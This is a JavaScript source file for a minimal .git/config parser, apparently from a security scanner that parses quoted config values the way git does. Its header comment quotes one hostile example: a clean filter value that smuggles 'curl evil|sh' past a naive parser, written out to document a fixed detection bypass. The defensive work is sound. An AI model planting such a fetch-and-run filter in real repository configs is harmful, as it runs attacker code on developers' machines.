// Minimal .git/config (INI-style) parser. No dependencies on purpose: a security
// scanner should not pull a supply chain of its own.
//
// The value scanner is a single pass with quote state, because git's is. The
// previous version stripped comments first and unquoted afterwards, which meant a
// quote opened halfway through a value was invisible to it:
//
//     clean = cat" ; curl evil|sh"
//     git reads:  cat ; curl evil|sh      <- and runs it
//     we read:    cat"                    <- and called it a bare command
//
// Anything that decides where a value ends has to know whether it is inside
// quotes at that point. That is the whole finding (review 02, N-2).

const ESCAPES = { n: '\n', t: '\t', b: '\b', '"': '"', '\\': '\\' };

/**
 * Read one config value the way git does.
 * Outside quotes: `#` and `;` start a comment, a tab is recorded as a space, and
 * trailing whitespace is dropped. Inside quotes: everything is literal except
 * a backslash escape. Quoted and unquoted runs concatenate.
 */
export function parseValue(raw) {
  let out = '';
  let inQuotes = false;
  let pendingSpace = '';        // whitespace held back until we know more follows

  for (let i = 0; i < raw.length; i++) {
    const ch = raw[i];

    if (ch === '\\') {
      const next = raw[++i];
      if (next === undefined) break;                 // trailing backslash: git continues the line
      out += pendingSpace; pendingSpace = '';
      out += Object.hasOwn(ESCAPES, next) ? ESCAPES[next] : next;
      continue;
    }

    if (ch === '"') { inQuotes = !inQuotes; out += pendingSpace; pendingSpace = ''; continue; }

    if (!inQuotes) {
      if (ch === '#' || ch === ';') break;           // comment, but only out here
      if (ch === ' ' || ch === '\t') { pendingSpace += ' '; continue; }
    }

    out += pendingSpace; pendingSpace = '';
    out += ch;
  }
  return out;
}

export function parseGitConfig(text) {
  const entries = [];
  let section = null;
  let subsection = null;

  const lines = text.split(/\r?\n/);
  for (let i = 0; i < lines.length; i++) {
    let line = lines[i].trim();
    const lineNumber = i + 1;

    if (!line || line.startsWith('#') || line.startsWith(';')) continue;

    const sectionMatch = line.match(/^\[\s*([A-Za-z0-9._-]+)\s*(?:"((?:[^"\\]|\\.)*)")?\s*\]/);
    if (sectionMatch) {
      section = sectionMatch[1].toLowerCase();
      subsection = sectionMatch[2] === undefined ? null : sectionMatch[2].replace(/\\(.)/g, '$1');
      const remainder = line.slice(sectionMatch[0].length).trim();
      if (!remainder || remainder.startsWith('#') || remainder.startsWith(';')) continue;
      line = remainder;
    }

    // Join backslash continuations the way git does: the next line is appended
    // verbatim, leading whitespace included.
    while (line.endsWith('\\') && !line.endsWith('\\\\') && i + 1 < lines.length) {
      line = line.slice(0, -1) + lines[++i].replace(/\s+$/, '');
    }

    const kv = line.match(/^([A-Za-z][A-Za-z0-9-]*)\s*(?:=\s*([\s\S]*))?$/);
    if (!kv || section === null) continue;

    const key = kv[1].toLowerCase();
    const value = kv[2] === undefined ? 'true' : parseValue(kv[2]);

    entries.push({ section, subsection, key, value, line: lineNumber });
  }

  return entries;
}
